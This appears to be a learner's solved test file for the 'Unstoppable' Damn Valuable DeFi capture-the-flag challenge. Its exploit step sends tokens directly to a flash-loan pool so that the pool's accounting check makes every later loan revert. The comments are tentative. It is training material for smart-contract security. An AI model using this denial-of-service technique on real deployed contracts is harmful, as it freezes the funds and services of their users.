/* WRITE OUT THE PURPOSE OF THIS FILE 
To utilize the vulnerability within the logic of the other contracts.
*/
const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
// const is used to keep the contract(s) the same
const DamnValuableToken = contract.fromArtifact('DamnValuableToken'); 
const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');

const { expect } = require('chai'); // { expect } is supposed to stay the same as the rules of Chai matchers? 

describe('[Challenge] Unstoppable', function () {

    const [deployer, attacker, someUser, ...otherAccounts] = accounts;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ether('1000000'); // Keeping the balance(s) consistent for lines 18 & 19
    const INITIAL_ATTACKER_BALANCE = ether('100');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });

        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });

        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);
    
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);

         // Show it's possible for anyone to take out a flash loan
         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
         await this.receiverContract.executeFlashLoan(10, { from: someUser });
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        await this.token.transfer(this.pool.address, 10, {from: attacker});
    });

    after(async function () {
        /** SUCCESS CONDITION */
        await expectRevert.unspecified( // This expectRevert is promising that an amount of 10 will be from someUser??
            this.receiverContract.executeFlashLoan(10, { from: someUser }) // Ca
        );
    });
});
